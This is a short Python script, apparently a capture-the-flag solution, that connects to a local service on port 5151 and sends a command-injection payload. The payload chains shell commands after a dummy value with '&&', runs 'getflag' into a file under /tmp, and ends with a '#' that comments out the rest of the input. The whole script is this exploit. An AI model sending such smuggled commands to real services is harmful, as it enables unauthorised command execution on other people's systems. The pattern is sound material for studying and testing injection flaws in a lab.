import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 5151))
s.send('1 && mkdir -p /tmp/flag11 && getflag > /tmp/flag11/flag #\n')
s.close()